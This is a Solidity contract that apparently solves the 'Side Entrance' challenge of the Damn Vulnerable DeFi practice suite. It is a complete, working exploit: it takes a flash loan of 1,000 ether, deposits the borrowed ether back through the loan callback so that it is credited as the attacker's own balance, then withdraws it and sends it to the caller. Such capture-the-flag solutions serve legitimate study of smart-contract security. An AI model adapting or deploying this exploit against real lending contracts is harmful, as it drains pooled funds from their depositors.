// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./SideEntranceLenderPool.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Attack is IFlashLoanEtherReceiver {
    using Address for address payable;

    SideEntranceLenderPool private immutable lenderPool;

    constructor(address _pool) {
        lenderPool = SideEntranceLenderPool(_pool);
    }

    function attack() external {
        lenderPool.flashLoan(1_000e18);
        lenderPool.withdraw();
        payable(msg.sender).sendValue(1_000e18);
    }

    function execute() external payable override {
        lenderPool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
